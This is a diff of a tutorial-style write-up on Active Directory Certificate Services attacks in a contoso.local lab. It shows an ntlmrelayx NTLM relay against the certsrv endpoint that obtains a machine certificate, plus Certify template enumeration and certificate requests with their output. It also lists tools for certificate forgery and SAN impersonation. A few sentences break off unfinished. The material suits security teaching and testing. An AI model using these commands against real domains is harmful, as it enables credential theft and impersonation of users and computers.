+                    155 99 253 89 254 16 182 135 91 217 64 125 76 48 163 34 17 189 251 212 163 194 242 108 71 218 249
+                    79 41 162 187 13 129 9 50 66 28 29 231 205 120 62 26 187 45 235 245 145 19 146 59 219 126 156 179
+                    66 38 150 175 22 187 70 247 226 86 202 147 58 198 232 226 217 150 129 155 68 20 54 113 238 216 165
+                    108 155 217 238 124 120 6 17 155 223 68 253 177 10 25 153 29 133 141 176 193 2 3 1 0 1 163 81 48
+                    79 48 11 6 3 85 29 15 4 4 3 2 1 134 48 15 6 3 85 29 19 1 1 255 4 5 48 3 1 1 255 48 29 6 3 85 29 14
+                    4 22 4 20 249 149 45 173 173 144 7 144 165 205 157 88 28 214 0 5 117 121 33 244 48 16 6 9 43 6 1 4
+                    1 130 55 21 1 4 3 2 1 0 48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 3 130 1 1 0 24 196 251 242 57 32
+                    77 9 12 24 232 203 193 100 241 137 121 205 3 55 163 212 38 118 8 96 138 57 84 228 31 51 78 223 169
+                    86 188 1 67 30 219 162 160 205 110 22 233 248 32 101 78 45 48 87 238 113 26 145 52 208 227 82 242
+                    42 126 101 254 102 227 152 207 199 10 0 198 82 140 51 244 81 58 158 105 99 208 214 23 114 239 86
+                    237 105 179 52 172 148 35 53 31 121 235 108 59 105 97 140 77 79 32 247 186 211 177 94 20 152 206
+                    242 46 98 23 190 20 95 92 101 230 202 140 148 232 19 148 228 47 128 193 169 202 159 57 9 101 158
+                    194 209 185 94 150 248 46 105 241 90 33 227 63 68 141 99 131 230 206 101 135 8 149 252 209 178 175
+                    134 123 122 90 29 253 97 9 169 16 199 112 4 235 26 251 72 53 222 140 253 71 22 126 213 227 166 97
+                    104 144 128 5 255 185 244 63 86 20 141 3 26 212 68 89 246 226 25 60 24 138 81 5 248 125 208 133 44
+                    24 112 198 117 41 124 158 55 113 159 59 153 93 226 1 234 0 187 65 15 0 192 3 81 231 177 17 140}
+DistinguishedName : CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local
+Name              : NTAuthCertificates
+ObjectClass       : certificationAuthority
+ObjectGUID        : c363c87a-1671-4c5d-95b0-29261a5ead87
+#+end_src
+
+Therefore if you are able to include your certificate in the
+=NTAuthCertificates= container, you can also forge certificates for authentication.
+
+**** Enrollment Services
+:PROPERTIES:
+:custom_id: enrollment-services
+:END:
+
+ADCS creates the Enrollment Services to allow users to request certificates. The
+Enrollment Services can be accessed through RPC calls by using the DCOM WCCE
+interface or HTTP if the web services are enabled.
+
+There are endpoints to access Enrollment Services:
+
+- The DCOM WCCE interface. This is the service used by [[https://github.com/GhostPack/Certify][Certify]] and [[https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certreq_1][certreq]].
+  
+- The RPC ICPR interface. It provides more limited functionality than WCCE, but
+  works over SMB.
+
+- The HTTPS endpoint offered by the role Certificate Enrollment Web Service. You can
+  access to it by =https://<CEPSERVER>/ADPolicyProvider_CEP_Kerberos/service.svc=.
+
+- The HTTP endpoint offered by the role Certificate Authority Web Enrollment.
+  You can access to it in the URL =http://<ADCSSERVER>/certsrv/=. This is the
+  service attacked by using [[https://github.com/ExAndroidDev/impacket/blob/ntlmrelayx-adcs-attack/examples/ntlmrelayx.py][ntlmrelayx.py]] (impacket ExAndroidDev version).
+
+- The HTTP endpoint offered by the role Network Device Enrollment Service. You
+  can access to it in the URLs:
+  + =http://<NDESSERVER>/CertSrv/mscep_admin=: To get an OTP (one-time password).
+  + =http://NDESSERVER/CertSrv/mscep/=: To get a certificate using the OTP.
+
+You can identify the Enrollment Services query for the =pKIEnrollmentService=
+objects in the =Configuration= partition of the AD database.
+
+#+begin_src powershell
+PS C:\> Get-ADObject -SearchBase "CN=Configuration,DC=contoso,DC=local" -LDAPFilter "(objectCategory=pKIEnrollmentService)" -Properties name,dnshostname,msPKI-Enrollment-Servers,certificateTemplates
+
+
+certificateTemplates     : {EnrollwithAgent, EnrollAgent, UserSAN, DirectoryEmailReplication...}
+DistinguishedName        : CN=contoso-DC01-CA,CN=Enrollment Services,CN=Public Key
+                           Services,CN=Services,CN=Configuration,DC=contoso,DC=local
+dnshostname              : dc01.contoso.local
+Name                     : contoso-DC01-CA
+ObjectClass              : pKIEnrollmentService
+ObjectGUID               : 9496354e-757b-4abe-b27d-ac06de0e7132
+#+end_src
+
+Here you can see that there is one Enrollment Service of the CA
+=contoso-DC01-CA= that is available in the =dc01.contoso.local= computer. Also,
+you can check the templates associated to the service.
+
+You can check if the Certificate Authority Web Enrollment endpoint exists with a
+HTTP request:
+#+begin_src powershell
+PS C:\> curl http://dc01.contoso.local/certsrv/
+curl : Server Error
+401 - Unauthorized: Access is denied due to invalid credentials.
+You do not have permission to view this directory or page using the credentials that you supplied.
+At line:1 char:1
++ curl http://dc01.contoso.local/certsrv/
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
+   eption
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+#+end_src
+
+This endpoint requires credentials, so we know that it exists due to the error
+message. Good to know, because the Certificate Authority Web Enrollment [[https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/][HTTP
+endpoints can be abused through NTLM relay attacks]] to get certificate for other
+users and computers. You can use [[https://github.com/ExAndroidDev/impacket/blob/ntlmrelayx-adcs-attack/examples/ntlmrelayx.py][ntlmrelayx.py]] (impacket ExAndroidDev version)
+combined with [[https://github.com/topotam/PetitPotam/][PetitPotam]] or the printer bug ([[https://github.com/leechristensen/SpoolSample][SpoolSample]] or [[https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py][printerbug.py]]) to
+perform this attack.
+
+Here is an example of the NTLM relay attack:
+#+begin_src 
+$ python3 ntlmrelayx.py -t http://dc01.contoso.local/certsrv/certfnsh.asp -smb2support --adcs
+Impacket v0.9.24.dev1+20210727.163808.5f1ced6d - Copyright 2021 SecureAuth Corporation
+
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+[*] Setting up WCF Server
+
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-4: Connection from CONTOSO/WS01-10$@192.168.100.10 controlled, attacking target http://dc01.contoso.local
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://dc01.contoso.local as CONTOSO/WS01-10$ SUCCEED
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] GOT CERTIFICATE!
+[*] Base64 certificate of user WS01-10$: 
+MIIQ/QIBAzCCEMcGCSqGSIb3DQEHAaCCELgEghC0MI...[STRIPPED]...
+#+end_src
+
+As you can see, to request a certificate, the user must create a [[https://en.wikipedia.org/wiki/Certificate_signing_request][CSR]]
+(Certificate Signing Request) and send it to the Enrollment. The CSR indicates
+the information related to the user, like the subject, and in some cases in can
+include a SAN (Subject Alternative Name), allowing the user to impersonate other
+users.
+
+Apart from the CSR, the user must indicate in the request which template is
+required to be used by the CA to issue the certificate.
+
+**** Certificate Templates
+:PROPERTIES:
+:custom_id: certificate-templates
+:END:
+
+The templates are other interesting entity to know about. They serve to the following
+purposes:
+
+- Define the usages of the certificates being issued. It defines if the
+  certificates issued based on the template can be used for authentication, code
+  signing, enrollment agent, CA, etc.
+  
+- Define the requirements of the CSR (Certificate Signing Request) sent by the
+  client. For example, a template may require that a CSR will be signed by
+  several other certificates (like Enrollment Agents) or it may need to be
+  revised manually by an IT member.
+
+- Indicates who is allowed to enroll in the template (through [[#acls][ACLs]]).
+
+The [[https://github.com/GhostPack/Certify][Certify]] tool can be used to get the information of the templates and check
+the usages of each as well as the requirements:
+
+#+begin_src 
+PS C:\> .\Certify.exe find
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=contoso,DC=local'
+
+[*] Listing info about the Enterprise CA 'contoso-DC01-CA'
+
+    Enterprise CA Name            : contoso-DC01-CA
+    DNS Hostname                  : dc01.contoso.local
+    FullName                      : dc01.contoso.local\contoso-DC01-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=contoso-DC01-CA, DC=contoso, DC=local
+    Cert Thumbprint               : 11EBB28FAFA3CE28E14E069D8C038D3CEA2BFDF1
+    Cert Serial                   : 23D21EB948AC688545EC15FEB03B0C33
+    Cert Start Date               : 01/08/2021 14:49:46
+    Cert End Date                 : 01/08/2026 14:59:46
+    Cert Chain                    : CN=contoso-DC01-CA,DC=contoso,DC=local
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               CONTOSO\Domain Admins         S-1-5-21-1372086773-2238746523-2939299801-512
+      Allow  ManageCA, ManageCertificates               CONTOSO\Enterprise Admins     S-1-5-21-1372086773-2238746523-2939299801-519
+    Enrollment Agent Restrictions : None
+
+[*] Available Certificates Templates :
+
+    CA Name                         : dc01.contoso.local\contoso-DC01-CA
+    Template Name                   : User
+    Schema Version                  : 1
+    Validity Period                 : 1 year
+    Renewal Period                  : 6 weeks
+    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required  : 0
+    pkiextendedkeyusage             : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : CONTOSO\Domain Admins         S-1-5-21-1372086773-2238746523-2939299801-512
+                                      CONTOSO\Domain Users          S-1-5-21-1372086773-2238746523-2939299801-513
+                                      CONTOSO\Enterprise Admins     S-1-5-21-1372086773-2238746523-2939299801-519
+      Object Control Permissions
+        Owner                       : CONTOSO\Enterprise Admins     S-1-5-21-1372086773-2238746523-2939299801-519
+        WriteOwner Principals       : CONTOSO\Domain Admins         S-1-5-21-1372086773-2238746523-2939299801-512
+                                      CONTOSO\Enterprise Admins     S-1-5-21-1372086773-2238746523-2939299801-519
+        WriteDacl Principals        : CONTOSO\Domain Admins         S-1-5-21-1372086773-2238746523-2939299801-512
+                                      CONTOSO\Enterprise Admins     S-1-5-21-1372086773-2238746523-2939299801-519
+        WriteProperty Principals    : CONTOSO\Domain Admins         S-1-5-21-1372086773-2238746523-2939299801-512
+                                      CONTOSO\Enterprise Admins     S-1-5-21-1372086773-2238746523-2939299801-519
+........[STRIPPED].......  
+#+end_src
+
+Be aware than apart from the requirements of the templates, is also important to
+notice the ACLs from the CA, since it can be restricted to an specific group of
+users. Moreover, it is relevant to note that a client only can enroll in the
+templates available in the Enrollment Service, even if there are more defined in
+the AD. So maybe, you can find vulnerable templates that are only accessible
+through an specific Enrollment Service.
+
+*** ADCS Attacks
+:PROPERTIES:
+:custom_id: adcs-attacks
+:END:
+    
+Now that we know about the entities involved with ADCS, let's talk about what
+attacks can be performed against this infrastructure. I will only describe what
+I consider the most relevant/impactful attacks, so to get a complete description
+of all of them, please read the [[https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf][Certified Pre-Owned whitepaper]].
+
+**** Request certificate
+:PROPERTIES:
+:custom_id: request-certificate
+:END:
+
+First thing to note is that certificates are other way of prove user identity
+and they are not linked to user passwords (like NTLM or Kerberos keys), so if
+the user changes its password, the certificate is still valid. So, the first way
+of abusing certificates is requesting them.
+
+In case you can execute requests as the target user (by having its credentials
+or from its execution context in computer), you can ask for a certificate by
+using [[https://github.com/GhostPack/Certify][Certify]] or [[https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certreq_1][certreq]].
+
+Remember that its important to select the adequate template to request the
+certificate, since what we usually search is to get a certificate that allows us
+to use it for authentication. For that we need one of the following EKUs present
+in the template:
+
+- Client Authentication (OID 1.3.6.1.5.5.7.3.2)
+- PKINIT Client Authentication (OID 1.3.6.1.5.2.3.4)
+- Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)
+- Any Purpose (OID 2.5.29.37.0)
+- No EKUs
+
+Fortunately, in ADCS there are some default templates (used by default for any
+Enrollment Service) that allows users to Authenticate, like the =User= template,
+and the =Computer= template in case of computers.
+
+By default, Certify will ask a certificate using the current user and the
+template =User=.
+
+#+begin_src 
+PS C:\Users\Anakin\Downloads\Certify-main\Certify\bin\Release> .\Certify.exe request /ca:dc01.contoso.local\contoso-DC01-CA
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : CONTOSO\anakin
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : User
+[*] Subject                 : CN=Anakin, CN=Users, DC=contoso, DC=local
+
+[*] Certificate Authority   : dc01.contoso.local\contoso-DC01-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 87
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAwoR86nNFfjcHWZmfcANr8KbnvAVJLsQL7qdeAihXuOGp4SwH
+Cvdm0iqunTP4lkOMEJVxe5bQeqeRWl5qz4GyIfPpD6QeqAVMdvebmMZtlfcQP7en
+                 ........[STRIPPED].......
+X0moanjEr9Yy1JR2CzUq6R+pJHZ8zdZM875c2a/G+bBGu96yVHv6eOOsNUieq+1x
+S7Y4NwKBgACW6eOsvZaZjxLu3Rc+Jfx30TknwpdJYOm0+DnG2q+qrZRwk53ufTPI
+E0Q9IvGywgMCd2FyvfmNySt3jz79ZQ5t0hOm7/qiMTkTxjLNCvNtI5WZVQzNkh1U
+xFi8p9oV3gDaUNtF4m8L/Hudqt+/cUf0v28DxhfSwUMAvj3B6ymN
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIFzjCCBLagAwIBAgITdQAAAFcb3kdpf6uTugAAAAAAVzANBgkqhkiG9w0BAQsF
+ADBKMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFzAVBgoJkiaJk/IsZAEZFgdjb250
+b3NvMRgwFgYDVQQDEw9jb250b3NvLURDMDEtQ0EwHhcNMjEwODE1MTUwNzA2WhcN
+                ........[STRIPPED].......
+BP23NqOJoEX6ZjicAq8RHwCE31fNU1/jmK311EGbc7U/fNYOgasYqJmqMkfDFCkq
+63M0iIrzRAumd2g39ecJwbTMIUAyDKgm/gMG0N51Cij6uxo3hGYP1NpAqANcNfzV
+RLo=
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+#+end_src
+
+
+
+**** Request certficate with SAN
+:PROPERTIES:
+:custom_id: request-certificate-with-san
+:END:
+
+Sometimes, you can also request a certificate for another user and impersonate
+it. There are several situations that leads to this.
+
+The first one is to found a template that allows you to specify a SAN (Subject
+Alternative Name).
+
+Moreover the template should create a certificate for authentication and allow
+you to request the certificate (enroll permissions). Additionally the request
+should not require any extra signature in the CSR (Certificate Signing Request)
+or being revised manually. These requirements are not so difficult to achieve.
+
+
+
+
+- There is a certi
+
+But there are other ways to get certificates, you can stolen then
+
+- The certificates are valid even if the user changes its password. They need to
+  be revoked independently.
+
+- If the service allows you to specify a SAN (Subject Alternative Name) in the
+  certificate request, then it is possible ([[https://posts.specterops.io/certified-pre-owned-d95910965cd2#180f][more conditions are required]]) that
+  you can ask certificates for other users, and use them for impersonation.
+
+- If you get a pe
+
+- It is possible to perform NTLM relay attacks to the HTTP endpoints of
+  enrollment services to get certificates.
+
+- If you get the private key of a CA, then you can forge your own certificates
+  to impersonate any user in the domain.
+
+Moreover, to exploit the attacks described in the whitepaper there are the
+following tools available:
+
+- [[https://github.com/GhostPack/Certify][Certify]]: C# tool to recollect information related with ADCS, identify
+  vulnerabilities in the configuration and request certificates.
+
+- [[https://github.com/GhostPack/ForgeCert][ForgeCert]]: C# tool to forge "Golden certificates" for any user by using the CA
+  (Certificate Authority) private key.
+
+- [[https://github.com/GhostPack/Rubeus][Rubeus]]: C# tool that allows to request Kerberos tickets by using certificates.
+
+- [[https://github.com/gentilkiwi/kekeo][kekeo]]: C tool that allows to request Kerberos tickets by using certificates.
+  It also allows to retrieve the NTLM of the target account.
+
+- [[https://github.com/dirkjanm/PKINITtools][PKINIT tools]]: Python tools to request Kerberos tickets by using certificates.
+  They allow also to retrieve the NTLM of the target account.
+
+- [[https://github.com/ExAndroidDev/impacket/blob/ntlmrelayx-adcs-attack/examples/ntlmrelayx.py][ntlmrelayx.py]] (ExAndroidDev version): Python tool to perform NTLM relay
+  against HTTP endpoints of certificate enrollment services of ADCS. It can be
+  combined with [[https://github.com/topotam/PetitPotam/][PetitPotam]] or the printer bug ([[https://github.com/leechristensen/SpoolSample][SpoolSample]] or [[https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py][printerbug.py]]).
 
 * Recommended resources
 :PROPERTIES:
